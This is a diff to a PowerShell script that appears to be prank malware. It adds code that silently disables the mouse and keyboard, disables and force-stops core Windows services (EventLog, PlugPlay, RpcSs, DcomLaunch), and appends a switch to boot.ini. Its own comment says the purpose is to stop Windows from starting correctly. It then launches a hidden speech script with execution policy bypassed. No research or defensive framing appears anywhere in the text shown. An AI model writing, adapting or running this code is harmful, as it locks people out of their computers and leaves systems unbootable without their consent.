@@ -34,13 +34,28 @@ while ($true) {
 $speechScriptPath = "$PWD\speech.ps1"
 Set-Content -Path $speechScriptPath -Value $speechScriptContent
 
-$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
-$valueNames = @("NoClose", "NoLogOff", "NoTrayContextMenu")
+# Disable mouse and keyboard drivers
+$mouseDriver = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Mouse*" }
+$keyboardDriver = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Keyboard*" }
 
-foreach ($valueName in $valueNames) {
-    if (-not (Test-Path -Path "$registryPath\$valueName")) {
-        New-ItemProperty -Path $registryPath -Name $valueName -Value 1 -PropertyType DWord -Force
-    }
+if ($mouseDriver) {
+    Disable-PnpDevice -InstanceId $mouseDriver.InstanceId -Confirm:$false
+}
+
+if ($keyboardDriver) {
+    Disable-PnpDevice -InstanceId $keyboardDriver.InstanceId -Confirm:$false
+}
+
+# Disable necessary services to prevent Windows from starting correctly
+$services = @("EventLog", "PlugPlay", "RpcSs", "DcomLaunch")
+foreach ($service in $services) {
+    Set-Service -Name $service -StartupType Disabled
+    Stop-Service -Name $service -Force
+}
+
+$bootConfigPath = "C:\Windows\System32\boot.ini"
+if (Test-Path -Path $bootConfigPath) {
+    Add-Content -Path $bootConfigPath -Value "/FAILSAFE"
 }
 
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
